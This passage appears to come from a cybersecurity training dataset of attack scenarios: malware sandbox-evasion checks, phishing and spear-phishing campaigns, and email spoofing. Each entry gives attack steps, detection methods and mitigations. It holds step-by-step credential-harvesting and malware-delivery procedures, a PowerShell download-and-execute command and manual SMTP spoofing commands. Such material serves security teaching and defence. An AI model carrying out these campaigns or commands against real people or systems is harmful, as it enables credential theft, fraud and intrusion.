Attack Steps: Step 1: Use Python or PowerShell to read System Up Time and event log entries for Event ID 6005.Step 2: Count how many reboots have occurred in the past 24 hours.Step 3: If more than 3–5 reboots are detected, assume sandbox activity.Step 4: If normal uptime and fewer reboots, proceed.Step 5: Simulate repeated reboots in a test VM and see impact.Step 6: Compare logs with a fresh installation.
Vulnerability: Frequent reboots due to snapshot use
Detection Method: Analyze Windows Event Logs
Solution: Randomize or reset log entries in sandbox

Title: GDI Object Count Analysis
Scenario Description: Malware creates GDI objects (Windows GUI handles) to test resource limitations common in VMs.
Attack Steps: Step 1: Use CreateCompatibleDC or Python GUI libraries to create thousands of GDI objects (fonts, pens, brushes).Step 2: Monitor how many handles the system allows (VMs usually cap at ~10,000).Step 3: If GDI object count maxes out quickly, assume VM and exit.Step 4: On real systems, the limit is much higher or dynamic.Step 5: Track memory usage and handle leak behavior in sandbox.Step 6: Test the OS reaction by watching taskmgr.
Impact: Prevents malware from running in constrained VM GUI
Detection Method: Detect high GDI handle creation
Solution: Raise GDI limits in analysis machine

Title: CPU Vendor String & Serial Mismatch
Scenario Description: Malware compares CPU vendor with serial number logic. Fake CPUs in VMs may have mismatched info.
Attack Steps: Step 1: Retrieve CPU vendor string via CPUID (e.g., "GenuineIntel").Step 2: Retrieve CPU serial from SMBIOS or registry.Step 3: Apply validation logic (e.g., Intel CPUs should not have serials starting with “00”).Step 4: If mismatch found, assume emulated environment.Step 5: Log result and either continue or abort.Step 6: Compare values from real system and VM.
Impact: Malware avoids virtual or spoofed CPU info
Detection Method: Track low-level CPU ID queries
Solution: Patch serial/Vendor string via hypervisor

Title: RAM Size Anomaly
Scenario Description: Malware detects low memory size (e.g., 1GB or 2GB) which is common in sandboxed test environments.
Attack Steps: Step 1: Use psutil.virtual_memory().total to check total RAM.Step 2: If size < 3GB, assume VM.Step 3: If ≥ 4GB, assume physical machine.Step 4: Log result and adjust behavior accordingly.Step 5: Run in sandbox VM with 2GB and real system with 8GB for testing.Step 6: Show students how changing VM RAM alters execution.
Detection Method: Detect low RAM checks in code
Solution: Allocate larger memory to analysis VM

Title: Fake Office365 Login Page via Email
Scenario Description: Attacker sends a fake Office365 login email requesting users to re-login due to "security policy update." Clicking the link leads to a cloned login portal.
Tools Used: Gophish, SEToolkit, Apache Web Server, SocialFish
Attack Steps: Step 1: Set up phishing infrastructure using SocialFish or Gophish.Step 2: Clone the Office365 login page using SocialFish.Step 3: Host the fake page on a cloud-based Apache server.Step 4: Use Gophish to send mass emails with subject: “Microsoft Security Update Required”.Step 5: Include button “Re-Login Now” linking to fake portal.Step 6: User enters credentials on fake page.Step 7: Captured credentials are logged in attacker server.Step 8: Redirect user to actual Office365 site to avoid suspicion.
Vulnerability: Lack of Email Filtering / No URL Inspection
Detection Method: Email Gateway Logs, Phishing URL sandbox analysis
Solution: Enable ATP in Office365, Implement SPF/DKIM/DMARC

Title: Fake HR Bonus Document With Malware Link
Scenario Description: User receives an email from “HR Dept” with a link to a fake “Bonus Announcement.” Link points to a malicious ZIP archive.
Attack Steps: Step 1: Craft a fake HTML email template mimicking HR branding.Step 2: Create a ZIP file containing an obfuscated .exe malware using msfvenom.Step 3: Host ZIP file on local HTTP server (Python or Apache).Step 4: Send phishing email using Gophish with subject: “Year-End Bonus Notification”.Step 5: Include a fake button: “Download Bonus Details”.Step 6: User clicks the link and downloads ZIP.Step 7: User extracts ZIP and runs .exe assuming it's a PDF.Step 8: Malware silently runs in background and connects to attacker.
Detection Method: Antivirus alerts, Process monitoring
Solution: Block executables in ZIPs, train users to check file extensions

Title: Fake Domain CEO Impersonation (Whaling)
Scenario Description: Attacker registers a domain similar to company’s (e.g., micros0ft.com) and impersonates the CEO to request an urgent wire transfer.
Attack Steps: Step 1: Register a domain that looks similar to the company domain.Step 2: Configure email service with that domain (e.g., Zoho, ProtonMail).Step 3: Find names of CFO/Finance team from LinkedIn.Step 4: Write a spoofed urgent email: “Immediate wire needed for acquisition”.Step 5: Send it to the finance team from spoofed domain.Step 6: If target responds, attacker replies with transfer instructions.Step 7: If successful, funds are wired to attacker's account.Step 8: Attack logs deleted or attacker disappears.
Vulnerability: Lack of domain validation + social engineering
Detection Method: Domain similarity analysis, Email header checks
Solution: Register similar domains, Verify fund requests via voice

Title: Credential Phish via Fake Email Quarantine Notice
Scenario Description: Target receives an email from “Email Security” saying a message is quarantined; asks to login to view.
Attack Steps: Step 1: Create an HTML email mimicking Mimecast or similar quarantine email.Step 2: Add “Quarantined message: Payroll Slip” with “Release” button.Step 3: Button links to fake login page (cloned from actual email provider).Step 4: Set up Gophish campaign targeting 100+ employees.Step 5: Send spoofed emails using Python SMTP and forged headers.Step 6: Users click “Release” and enter email+password.Step 7: Credentials are saved in attacker-controlled database.Step 8: Redirect to “Message Released” page for realism.
Detection Method: Phishing email detection, Mail header anomaly
Solution: Educate users, use Zero Trust login policies

Title: Phishing via Encrypted Attachment Trick
Scenario Description: Attacker sends a password-protected ZIP with a Word document containing malicious macro. Email includes password.
Attack Steps: Step 1: Generate malicious Word macro using msfvenom.Step 2: Embed macro into .docm Word file (enable content prompt).Step 3: Compress it into a password-protected .zip using 7-Zip.Step 4: Compose phishing email: “Secure Payroll File Enclosed”.Step 5: Include ZIP and note: “Password: HR2025”.Step 6: Send via Gmail/Outlook to bypass antivirus scanning.Step 7: User opens ZIP, enters password, enables macros.Step 8: Payload runs silently and connects to C2 server.
Detection Method: Endpoint logs, macro execution alerts
Solution: Block password ZIPs, Disable macros by default

Title: Dropbox File Share Phish
Scenario Description: Attacker sends a Dropbox “shared file” email prompting login to view document, which actually leads to a fake Dropbox login page.
Tools Used: Gophish, Dropbox Page Cloner (HTTrack), Apache Server
Attack Steps: Step 1: Clone the Dropbox login portal using HTTrack or SocialFish.Step 2: Host the cloned page on a VPS with HTTPS.Step 3: Create a Dropbox-style email with subject: “File Shared: Q2_Invoice.pdf”.Step 4: Embed a “View File” button linked to fake Dropbox URL.Step 5: Deploy campaign via Gophish to selected employees.Step 6: Target clicks the button thinking it’s real.Step 7: Fake page asks for Dropbox/Google login — captures creds.Step 8: Credentials are emailed or stored in attacker's backend.
Vulnerability: Email lacks link validation or preview
Detection Method: Link reputation engine, UEBA
Solution: Block custom-hosted Dropbox clones

Title: Fake Survey with Gift Card Bait
Scenario Description: Attacker sends email offering a fake company-sponsored survey for a chance to win an Amazon gift card. Survey asks for email and password “for verification.”
Tools Used: SurveyMonkey clone, Google Forms clone, Gophish
Attack Steps: Step 1: Clone a basic online survey layout using Google Forms or custom HTML.Step 2: Add fields: name, email, and password (fraudulently framed as “employee ID verification”).Step 3: Set up Gophish email template: “🎁 Complete our 2-min survey, win $25!”Step 4: Add fake reply-to as “hr-gifts@company-gifts.com”.Step 5: Send email to employees using company-style branding.Step 6: User clicks link, fills form.Step 7: Email/password combo captured silently.Step 8: Show “Thank You” page to make it appear legitimate.
Vulnerability: No awareness about credential misuse in forms
Detection Method: Monitor outbound form submissions
Solution: Employee training on phishing forms

Title: LinkedIn Connection Phish
Scenario Description: Attacker mimics a LinkedIn notification email saying a recruiter is trying to connect, links to a fake LinkedIn login page.
Attack Steps: Step 1: Use HTTrack to copy LinkedIn login page layout.Step 2: Host cloned page on a realistic domain like linkedln-careers.com.Step 3: Compose email: “John from Amazon wants to connect with you on LinkedIn.”Step 4: Insert LinkedIn-styled logo and content with “Accept Connection” button.Step 5: Button redirects to cloned login page.Step 6: Target enters credentials thinking it’s real.Step 7: Attacker logs credentials to file and redirects to real LinkedIn.Step 8: No visual clue of the phish remains.
Vulnerability: Visual similarity to real social platform
Detection Method: Email URL inspection, brand impersonation detector
Solution: Block typosquatting domains, train for brand spoof detection

Title: Security Alert Phish with MFA Bypass
Scenario Description: Attacker sends fake security alert and uses real-time reverse proxy (evilginx2) to capture session cookies during MFA.
Attack Steps: Step 1: Deploy Evilginx2 and configure phishing site to mirror Microsoft or Google login.Step 2: Register a domain like secure-notify-alert.com.Step 3: Craft email: “Security Alert: Suspicious login attempt blocked. Confirm identity.”Step 4: Insert “Secure My Account” button linking to evilginx site.Step 5: User logs in on real-looking page, completes MFA.Step 6: Evilginx captures session token (cookie) and redirects user to real site.Step 7: Attacker uses token to login without needing password or MFA.Step 8: Session hijack completed silently.
Detection Method: Impossible travel or token anomaly detection
Solution: Block known reverse proxies, re-auth on sensitive actions

Title: Phishing Using QR Codes in Attachments
Scenario Description: Attacker embeds a QR code in a PDF that leads to a fake login portal. User scans QR on phone, thinking it’s safe.
Tools Used: Canva, QR Code Generator, PDF Editor, Gophish
Attack Steps: Step 1: Clone target service login page (e.g., OneDrive).Step 2: Generate a QR code pointing to this phishing site.Step 3: Use Canva to make a PDF flyer titled “Company Document Access – Mobile Only”.Step 4: Embed QR code saying “Scan to Access”.Step 5: Attach PDF to an email with subject: “Updated Policies, Mobile Only Access”.Step 6: Victim scans QR on phone — sees fake login page.Step 7: Victim enters login credentials on mobile.Step 8: Attacker collects creds silently.
Detection Method: DNS filter logs, mobile traffic analysis
Solution: Warn against scanning unknown QR codes

Title: Chatbot-Based Phishing
Scenario Description: Phishing email links to a chatbot pretending to be IT support asking for credentials under the guise of troubleshooting.
Attack Steps: Step 1: Build a fake chatbot using Dialogflow (ex: “ITBot Assistant”).Step 2: Script responses: “Please verify your login to proceed.”Step 3: Send phishing email with subject: “New IT Virtual Assistant Now Live – Try It!”Step 4: Email links to chatbot URL.Step 5: User chats with bot thinking it’s internal IT.Step 6: Bot prompts: “To start, enter your email and password.”Step 7: Credentials are captured and logged.Step 8: Display fake “Troubleshooting complete” message.
Detection Method: Chatbot traffic analysis
Solution: Limit internal chatbot usage scope

Title: Voicemail-to-Email Phishing
Scenario Description: Email claims “You have a new voicemail.” Attachment opens a fake player interface prompting for login to listen.
Tools Used: Fake audio player HTML, Email spoofer, Gophish
Attack Steps: Step 1: Create HTML attachment that opens a fake audio player in browser.Step 2: When clicked, player says: “Sign in to listen to voicemail.”Step 3: Create phishing email: “Missed Call from Unknown Number”.Step 4: Use forged “voicemail@company.com” as sender.Step 5: Attach fake voicemail HTML page.Step 6: User opens attachment, sees login prompt.Step 7: Enters email and password — sent to attacker.Step 8: Redirect to “Voicemail Deleted” screen.
Detection Method: Attachment scanning, script analysis
Solution: Disable HTML attachments, use voice gateway alerts

Title: Shared Calendar Invite Phish
Scenario Description: Attacker sends a calendar invite (.ics file) with malicious URL in location field. Email client auto-accepts invite.
Attack Steps: Step 1: Create a meeting invite .ics file with event location as phishing URL.Step 2: Compose fake email: “Mandatory Cybersecurity Briefing – Click to Join”.Step 3: Send email with .ics file attached.Step 4: Email client (e.g., Outlook) adds invite to calendar automatically.Step 5: User clicks meeting link from calendar.Step 6: Link opens fake login page.Step 7: User enters credentials.Step 8: Attacker logs them silently.
Detection Method: Calendar event monitoring
Solution: Restrict auto-adding calendar invites

Title: Internal Email Forward Phish
Scenario Description: Attacker uses a previously hacked account to forward old thread with new malicious link, appearing internal and trusted.
Attack Steps: Step 1: Gain access to internal user account via previous phishing.Step 2: Open old work thread with finance or HR.Step 3: Forward thread adding: “Please check attached invoice.”Step 4: Attach a new link (malware or phishing site).Step 5: Because it’s a known thread, the email seems legitimate.Step 6: Recipient opens link, believes it’s safe.Step 7: Malware executes or login creds harvested.Step 8: Attacker moves laterally or steals data.
Detection Method: Forwarded thread anomaly detection
Solution: Monitor forwarding behavior, restrict legacy auth

Title: Phishing via Fake IT Helpdesk Ticket
Scenario Description: Email claims there's an open ticket and prompts to "view and verify access" via link that leads to login form.
Attack Steps: Step 1: Clone a real IT ticket system (e.g., Zendesk login page).Step 2: Compose email: “IT Helpdesk: Ticket #48933 – Urgent Login Required”.Step 3: Insert link “View Ticket” which goes to cloned login.Step 4: Send via spoofed address: it-support@company.com.Step 5: Victim clicks link and sees realistic support portal.Step 6: Asked to login to view ticket – credentials captured.Step 7: Victim is redirected to “Ticket Resolved” page.Step 8: Attacker uses credentials for access.
Detection Method: Ticket URL behavior analysis
Solution: Validate tickets via direct access only

Title: Fake Software License Expiry Phish
Scenario Description: Attacker sends fake alert claiming a software license (e.g., Adobe or Zoom) will expire, asking the user to “renew login.”
Attack Steps: Step 1: Clone Adobe login page using HTTrack.Step 2: Design a fake “License Expiry” HTML email template with Canva.Step 3: Compose message: “Your Adobe license will expire in 48 hours. Renew access.”Step 4: Link button to the cloned login page.Step 5: Host phishing site on HTTPS-secured domain (e.g., adobe-renewal.net).Step 6: Send phishing email via Gophish to internal users.Step 7: Victim clicks the link, enters credentials.Step 8: Credentials are silently logged by attacker.
Detection Method: Log access to phishing domains, alert on unknown auth source
Solution: Educate users on checking license status via official app only

Title: Phishing Using Fake Payment Receipt
Scenario Description: Attacker sends a fake payment confirmation PDF. PDF has embedded phishing URL claiming user needs to "log in to confirm or cancel."
Tools Used: PDF Phishing Toolkit, Adobe Acrobat Pro, Gophish
Attack Steps: Step 1: Design fake receipt using Acrobat Pro: “₹ 1,24,999 paid to XYZ Services.”Step 2: Embed a clickable link: “Click here to dispute this transaction.”Step 3: Host phishing page that mimics a bank or payment provider.Step 4: Send email with subject: “Transaction Alert: Payment Successful.”Step 5: Victim opens PDF, clicks link to fake login.Step 6: Enters email ID and password.Step 7: Attacker logs credentials.Step 8: Victim is redirected to official bank homepage to reduce suspicion.
Vulnerability: Trust in financial alerts, clickable PDFs
Detection Method: Endpoint PDF link analysis
Solution: Avoid links in transaction PDFs; confirm via banking app only

Title: Google Workspace Admin Panel Phish
Scenario Description: Attacker targets G Suite admins with fake security update email requiring login to admin console.
Attack Steps: Step 1: Clone Google Admin Console login page using HTTrack.Step 2: Host clone on phishing domain (e.g., gsuite-secure.org).Step 3: Compose phishing email: “Security Update Required – G Suite Admins Only.”Step 4: Add call-to-action: “Login to review admin policies.”Step 5: Send email only to admins via Gophish.Step 6: Victim logs into fake page.Step 7: Credentials and 2FA token (if using reverse proxy) are captured.Step 8: Attacker gains control of organization admin panel.
Vulnerability: Elevated privilege target, trust in admin alerts
Detection Method: Admin login logs, impossible travel alerts
Solution: Always use hardware keys for admin login

Title: Phishing via Browser Push Notification Lure
Scenario Description: Email includes link to a site that prompts the user to enable “push notifications” for a fake service. Future phishing is done via browser popups.
Attack Steps: Step 1: Set up fake site that immediately prompts user to allow browser notifications.Step 2: Compose email: “Activate updates from your COVID Vaccine Certificate Portal.”Step 3: Include link to this fake site.Step 4: User clicks, enables notifications.Step 5: Attacker now sends fake browser alerts: “Email expired – click to renew.”Step 6: Alerts open phishing login page.Step 7: Victim enters details; credentials are stolen.Step 8: Notifications continue until user disables them.
Detection Method: Monitor for malicious notification domains
Solution: Block notifications by default in enterprise browsers

Title: Email Delivery Failure Phishing
Scenario Description: Fake email appears to be from the email system, claiming that one or more messages failed delivery and must be reviewed.
Tools Used: Email Template Spoofer, Outlook Clone, Gophish
Attack Steps: Step 1: Design spoofed email mimicking Outlook 365: “Message not delivered to 3 recipients.”Step 2: Add link: “Click here to review undelivered emails.”Step 3: Host phishing login page mimicking Outlook.Step 4: Send email with spoofed Microsoft sender address.Step 5: Victim believes it’s a system alert, clicks link.Step 6: Enter login credentials to view emails.Step 7: Credentials are stolen and logged.Step 8: Redirect user to “No messages found” screen to reduce doubt.
Vulnerability: Familiarity with Outlook UI increases success
Detection Method: Analyze links claiming delivery failure
Solution: Customize real bounce-back alerts with internal branding

Title: Executive Spear Phish with Malicious Word Doc
Scenario Description: An attacker targets the CFO with a fake invoice from a known vendor, hiding a macro payload.
Tools Used: MS Word, Gophish, SET, PowerShell Empire
Attack Steps: Step 1: Identify the CFO's name and vendor names from LinkedIn or company news.Step 2: Create a fake invoice Word doc (e.g., “Q3_Vendor_Payment.docm”) with a malicious macro.Step 3: Program the macro to download a PowerShell payload.Step 4: Host the payload on a public server.Step 5: Craft a spoofed email from “finance@[knownvendor].com”.Step 6: Send the email using Gophish or a legitimate SMTP relay.Step 7: If the CFO opens the document and enables macros, the payload gets executed.Step 8: Attacker gets remote access via PowerShell reverse shell.
Impact: Remote code execution, financial data access
Detection Method: Endpoint macro behavior, outbound PowerShell
Solution: Block macros, use MFA, train employees
Tags: spear phishing, invoice fraud, macro payload

Title: HR Resume Payload Attack
Scenario Description: A fake job applicant sends a resume that contains an embedded payload disguised as a PDF.
Attack Steps: Step 1: Find open HR job postings on the company website.Step 2: Use EvilPDF to embed a reverse shell payload in a resume.Step 3: Rename the file to “Senior_Developer_Resume.pdf”.Step 4: Create a fake Gmail address like “rohit.jobseekers@gmail.com”.Step 5: Write a polite cover letter and attach the infected PDF.Step 6: Send it to hr@[targetcompany].com.Step 7: Once opened in an unpatched Adobe Reader, the payload executes.Step 8: Establishes reverse shell connection to attacker's system.
Detection Method: Network traffic, PDF sandbox alerts
Solution: Patch PDF readers, use sandboxing, disable scripts
Tags: PDF payload, job fraud, reverse shell

Title: CEO Spoof with Dropbox Payload Link
Scenario Description: An attacker pretends to be the CEO and shares a “contract” file via Dropbox with a hidden payload.
Attack Steps: Step 1: Get CEO’s name from LinkedIn and use email spoofing (spoofed reply-to header).Step 2: Generate a malicious .exe payload using msfvenom.Step 3: Compress it inside a ZIP and upload to Dropbox.Step 4: Create a shortened link using Bit.ly to avoid detection.Step 5: Draft email saying, “Please review this urgent contract -CEO”.Step 6: Send the email to a mid-level manager.Step 7: If victim clicks and downloads the file, executes the EXE.Step 8: A Meterpreter session is established back to attacker.
Detection Method: EDR alerts on unknown binary, Dropbox access logs
Solution: Block executable downloads, validate sender identity

Title: Spear Phishing via Chat App with Drive Link
Scenario Description: A threat actor uses Slack (integrated with email) to send a fake shared doc containing malicious script.
Attack Steps: Step 1: Join public Slack channels of target org if available or mimic internal messages.Step 2: Create an HTML file with embedded JS that redirects to a credential harvester.Step 3: Upload the HTML to Google Drive.Step 4: Share the file and get a view-only link.Step 5: Compose message like “@team Please review the new report ASAP”.Step 6: If someone clicks, it leads to credential capture.Step 7: The attacker receives credentials through web form backend.Step 8: Attacker accesses internal systems using harvested credentials.
Detection Method: URL filtering, cloud DLP alerts
Solution: Disable external HTML files, block URL redirectors

Title: Finance Team Phish with Excel Macro Payload
Scenario Description: A malicious Excel file is sent to the finance team disguised as a “budget planning template”.
Attack Steps: Step 1: Clone a real-looking Excel budget sheet from web templates.Step 2: Add a VBA macro that executes a hidden shell payload.Step 3: Host the shellcode on attacker server.Step 4: Embed macro to download & execute shell.Step 5: Save file as “Q4_Budget_Template.xlsm”.Step 6: Send via email with a spoofed domain like “budget@accountsreview.com”.Step 7: User opens and enables macro to see calculations.Step 8: Payload downloads and executes silently.
Impact: Remote access, exfiltration of financial data
Detection Method: Outbound connections, macro execution logs
Solution: Email filter for macros, employee macro warning training

Title: Simple Spoof Using SMTP Telnet
Scenario Description: A hacker sends a spoofed email pretending to be the CEO of a company using manual SMTP commands.
Attack Steps: Step 1: Open Command Prompt or Terminal. Step 2: Connect to a public SMTP server using: telnet smtp.example.com 25 Step 3: Type HELO attacker.com Step 4: Enter MAIL FROM:<ceo@targetcompany.com> Step 5: Enter RCPT TO:<employee@targetcompany.com> Step 6: Type DATA and compose message. Step 7: Type Subject: Urgent and fake CEO message. Step 8: End with . and QUIT
Detection Method: Check email headers, verify sender SPF/DKIM, use email gateway filters
Solution: Implement SPF/DKIM/DMARC, block open relays

Title: Spoofing via Python SMTP Script
Scenario Description: Attacker automates spoofed email using Python SMTP libraries to send fake notifications.
Attack Steps: Step 1: Write Python script using smtplib. Step 2: Set MAIL FROM to it-support@company.com Step 3: Set RCPT TO to victim’s email. Step 4: Craft email body saying “Reset your password here”. Step 5: Include fake reset link. Step 6: Run the script to send the spoofed email.
Detection Method: Log monitoring, mail headers, check link redirection
Solution: Email header validation, anti-spam solutions

Title: SMTP Spoof via Open Relay Abuse
Scenario Description: The attacker identifies an open SMTP relay to relay spoofed messages without authentication.
Attack Steps: Step 1: Use MXToolbox to find SMTP servers of target. Step 2: Scan for open relay using test commands. Step 3: Connect using telnet openrelay.com 25. Step 4: Use MAIL FROM: fake@trustedbank.com. Step 5: Use RCPT TO: victim@target.com. Step 6: Type malicious email with a link. Step 7: Relay the message and quit.
Detection Method: SMTP relay tests, anomaly headers
Solution: Block open relays, restrict by IP & auth

Title: Fake Invoice Email from Partner Domain
Scenario Description: Attacker spoofs a partner company’s email to send a fake invoice for payment diversion.
Attack Steps: Step 1: Register a lookalike domain like partner-c0mpany.com. Step 2: Use GoPhish to craft a fake invoice campaign. Step 3: Spoof sender to billing@partnercompany.com. Step 4: Attach fake invoice PDF with malicious macro. Step 5: Send it via SMTP using spoofed headers. Step 6: Await victim interaction.
Detection Method: Mail header analysis, domain similarity checks
Solution: Domain monitoring, user training

Title: Legal Department Payload in Fake Lawsuit Notice
Scenario Description: A fake law firm email is sent with a lawsuit notice PDF embedded with JavaScript payload.
Attack Steps: Step 1: Clone an actual lawsuit PDF format using public templates.Step 2: Insert malicious JavaScript using Adobe Acrobat Pro (or script it with SET).Step 3: Compose a spoofed email from a domain like “legal@[fakefirm].org” with legal language.Step 4: Attach the infected “Summons_Notice.pdf”.Step 5: Send to legal or compliance team.Step 6: If opened in vulnerable Acrobat version, the JS executes a hidden payload.Step 7: The JS downloads a secondary reverse shell script.Step 8: Attacker gains access to internal legal data.
Detection Method: PDF behavior monitoring, EDR alerts
Solution: Disable JS in PDFs, train legal staff
Tags: PDF payload, fake lawsuit, JS exploit

Title: IT Support Phish with Remote Access Trojan
Scenario Description: A fake IT alert instructs employees to run a "fix tool" executable, which is actually a RAT.
Tools Used: NjRAT, Fake IT notice template, SMTP2Go
Attack Steps: Step 1: Design a fake “Urgent: VPN Patch Required” email from “it-support@[company]helpdesk.net”.Step 2: Compile a RAT (like NjRAT) into a clean-looking “VPN_Patch.exe”.Step 3: Use SMTP2Go or a phish server to send bulk email.Step 4: Include short text like: “Run the attached tool to continue remote access.”Step 5: Attach the EXE and monitor with listener.Step 6: If executed, RAT grants full control over the system.Step 7: Attacker can enable webcam, keystrokes, or file transfer.Step 8: Persist access using registry or scheduled task.
Detection Method: Heuristic malware detection, behavior analysis
Solution: Block .exe attachments, enforce allowlist apps

Title: Fake Security Awareness Test with Payload Link
Scenario Description: Attacker mimics internal security training and delivers a payload via "fake test link".
Attack Steps: Step 1: Design a landing page clone of real company LMS (Learning Portal).Step 2: Embed JavaScript-based keylogger in the login form.Step 3: Host it on lookalike domain (e.g., “portal-securetraining.com”).Step 4: Send spoofed email from “security-awareness@[company].com”.Step 5: Email content says “Complete your quarterly security quiz”.Step 6: User clicks and enters credentials.Step 7: JS captures and sends credentials to attacker.Step 8: Attacker logs in to real system using those details.
Detection Method: Domain reputation scanning, keystroke alerts
Solution: Educate users to verify URLs, use 2FA
Tags: awareness phishing, fake portal, JS keylogger

Title: CVE Exploit Embedded in Excel Sheet
Scenario Description: An Excel file exploits CVE-2017-11882 to run code when opened. Used on vulnerable finance systems.
Attack Steps: Step 1: Generate malicious Excel using Metasploit’s CVE-2017-11882 module.Step 2: Fill sheet with fake financial data to appear normal.Step 3: Rename as “Quarterly_Tax_Report.xls”.Step 4: Attach in a spoofed email: “Tax deadline update, please review.”Step 5: Send to finance department.Step 6: When user opens file, embedded payload executes silently due to vulnerability.Step 7: Creates reverse connection to attacker.Step 8: Attacker can install backdoor or extract files.
Detection Method: Patch management systems, AV heuristics
Solution: Patch CVEs, disable ActiveX/COM in Office
Tags: CVE exploit, excel payload, finance phish

Title: Vendor Impersonation with ISO Payload
Scenario Description: A fake email from a trusted vendor sends an ISO file disguised as “latest project documents” containing malware.
Attack Steps: Step 1: Identify frequently contacted vendors from company press or social media.Step 2: Register a similar domain (e.g., “@vendor-international.com”).Step 3: Generate a reverse shell payload and embed it in a .LNK shortcut inside an ISO.Step 4: Name ISO “Project_Apollo_Docs.iso” and upload to transfer site.Step 5: Email: “As discussed, find updated documents inside.”Step 6: Attach or link ISO file.Step 7: If ISO is opened, user sees a shortcut which executes the shell.Step 8: Attacker receives shell access.
Detection Method: ISO mount monitoring, user behavior alerts
Solution: Block ISO via email, use file-type filtering
Tags: vendor spoof, ISO payload, shell access

Title: Contractor Targeting with Compromised DocuSign Link
Scenario Description: Attacker impersonates a contractor sharing a DocuSign link, which leads to credential phishing + payload download.
Tools Used: DocuSign clone page, Browser Exploit Kit, Credential Harvester
Attack Steps: Step 1: Attacker identifies a real contractor working with the organization (e.g., LinkedIn, vendor listings).Step 2: Registers a fake domain like secure-docusignportal.com.Step 3: Sets up a DocuSign-like phishing page.Step 4: Adds hidden iframe that drops a JavaScript-based exploit using a browser vulnerability.Step 5: Writes a believable email: “Hi, please sign the NDA via DocuSign.”Step 6: Sends email to legal and management staff.Step 7: Target clicks, enters login creds, and gets silently hit with browser exploit.Step 8: Attacker gets valid credentials and shell access.
Detection Method: Email logs, browser behavior alerts
Solution: Domain whitelisting, 2FA, block JS from unknown sources

Title: IT Staff Targeted with Fake GitHub Security Patch
Scenario Description: A fake GitHub security alert tricks IT staff to download a malicious .tar.gz file disguised as a patch.
Tools Used: GitHub email template, Metasploit Payload, tar archive
Attack Steps: Step 1: Clone GitHub’s security email format.Step 2: Build a reverse shell payload and compress it into a .tar.gz file named libssl_patch.tar.gz.Step 3: Upload payload to file hosting (anonfiles, etc.).Step 4: Compose spoofed email with subject “Critical libssl vulnerability patch for devops”.Step 5: Add GitHub-style warning footer, send to IT/devops team.Step 6: If victim extracts and runs file, reverse shell is opened.Step 7: Attacker uses shell to map IT infrastructure.
Detection Method: Endpoint behavior monitoring
Solution: Verify patches manually, avoid .tar from emails

Title: Accounting Staff Lured with Currency Conversion Tool
Scenario Description: Attacker sends fake "Excel Currency Converter" with macro that launches PowerShell payload.
Attack Steps: Step 1: Craft an Excel sheet named Currency_Converter_2025.xlsm with currency formulas.Step 2: Embed macro to execute a PowerShell command that fetches a payload from attacker's server.Step 3: Macro executes powershell -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(...)Step 4: Send spoofed email from “currency@financial-tools.org”.Step 5: Message says “Here’s the updated multi-currency tool as requested.”Step 6: User enables macro for calculator to work.Step 7: PowerShell downloads and executes attacker’s RAT.Step 8: Attacker gets control of the machine.
Detection Method: PowerShell alerts, macro event logs
Solution: Educate on macro risks, disable macros by default
Tags: Excel RAT, currency tool, powershell macro

Title: Email from “Internal IT” With System Cleaning Tool
Scenario Description: Fake internal email prompts user to run “cleanup.exe” which installs persistence backdoor.
Attack Steps: Step 1: Setup fake internal domain (e.g., internal-it-services[.]com).Step 2: Create fake email: “Routine system cleaning tool for performance improvement.”Step 3: Compress a malware-laced cleanup.exe in a zip file.Step 4: Send to 20 users with an internal-looking email signature.Step 5: Victim unzips and runs the EXE file.Step 6: EXE silently drops files into AppData\Roaming and creates a registry entry for persistence.Step 7: Attacker gets periodic callbacks from the infected system.
Detection Method: Registry changes, process behavior
Solution: Use signed internal tools only, restrict EXE execution
Tags: internal spoof, fake cleaner, persistent malware

Title: Media Team Targeted with “Graphic Pack” ZIP
Scenario Description: Attacker sends fake PR media asset zip with image files and malicious .scr payload.
Attack Steps: Step 1: Create zip archive named Client_Campaign_Pack.zip containing: - 4 real-looking images - Thumbnail.scr (renamed malware).Step 2: Spoof PR agency domain like @creativemindspr.com.Step 3: Email message says: “Here’s the new banner pack we discussed.”Step 4: User opens ZIP, sees images and .scr disguised as image thumbnail.Step 5: Double-click launches hidden RAT.Step 6: Attacker maintains control using a hidden startup script.
Detection Method: File extension monitoring, sandbox alerts
Solution: Show file extensions, restrict .scr execution
Tags: media phish, ZIP attack, disguised payload

Title: CEO Travel Request Impersonation
Scenario Description: A travel document request to executive assistant leads to payload delivery via Dropbox link.
Attack Steps: Step 1: Create polyglot PDF that contains hidden EXE within valid PDF.Step 2: Name it “CEO_Travel_Itinerary.pdf”.Step 3: Upload to Dropbox and shorten link.Step 4: Spoof email: “Hi, attach this itinerary to CEO’s expense report.”Step 5: Sent to exec assistant.Step 6: Upon opening the PDF, an embedded script extracts and executes payload.Step 7: Backdoor opens on victim’s system.
Detection Method: Polyglot file detection, Dropbox traffic
Solution: Disable embedded file execution in PDFs
Tags: travel phish, dropbox payload, polyglot PDF

Title: Customer Support Email with CRM Report Macro
Scenario Description: CRM "report" Excel file with hidden macro is sent to support team member.
Attack Steps: Step 1: Create Excel titled “CRM_Feedback_Report_Q3.xlsm”.Step 2: Embed VBA macro to execute command-line downloader for payload.Step 3: Obfuscate macro using string split/join method.Step 4: Craft email from “support-insights@customerconnect.com”.Step 5: Message says: “Compiled latest customer feedback. Please review.”Step 6: User opens and enables macro for charts to render.Step 7: Macro executes obfuscated download and runs backdoor.Step 8: Attacker begins screen monitoring.
Detection Method: Obfuscation detection, macro execution logs
Solution: Disable all macros with group policy
Tags: support phish, excel macro, CRM spoof

Title: Spear Phishing to Recruiter with Resume Link
Scenario Description: Recruiter receives a fake resume link from job portal containing malicious script.
Tools Used: Pastebin, HTML link shortener, resume template
Attack Steps: Step 1: Create a resume with a link like “View portfolio here: [bit.ly/...]”.Step 2: Bit.ly redirects to an HTML file hosted on Pastebin with JS keylogger.Step 3: Fake email from “anish.resume.applicant@outlook.com”.Step 4: Subject: “Resume for Marketing Analyst Role”.Step 5: When clicked, page shows resume layout but has a keylogger form at bottom.Step 6: Captures keystrokes and posts to attacker’s endpoint.Step 7: Attacker collects credentials from HR systems.
Detection Method: URL inspection, JS input behavior
Solution: Disallow 3rd party resume links

Title: Accounting Supervisor Sent .lnk Payload in Zip
Scenario Description: Fake invoice ZIP contains shortcut file (Invoice.lnk) that executes hidden script.
Tools Used: LNK payload, Visual Basic, Windows Scripting Host
